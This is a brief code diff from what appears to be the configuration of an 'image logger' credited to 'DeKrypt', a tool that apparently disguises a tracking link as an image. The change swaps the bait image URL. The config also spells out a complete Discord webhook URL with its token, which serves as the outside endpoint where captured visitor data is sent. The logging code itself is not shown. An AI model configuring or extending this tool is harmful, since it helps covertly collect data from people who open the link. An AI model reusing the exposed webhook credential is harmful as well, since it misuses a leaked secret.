@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1527823726043992084/PaiFc7izaoePEzSk_9qIVv8OAcyMjNxtGREy8qW498i6n-qwihSWOKoYMeaxUMayo_Y5",
-    "image": "https://fiverr-res.cloudinary.com/videos/t_main1,q_auto,f_auto/l9xzkwuq15s2ij0a69if/design-professional-modern-logo-for-your-branding-project.png", # You can also have a custom image by using a URL argument
+    "image": "https://imgv3.fotor.com/images/homepage-feature-card/Random-image-generator_5.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
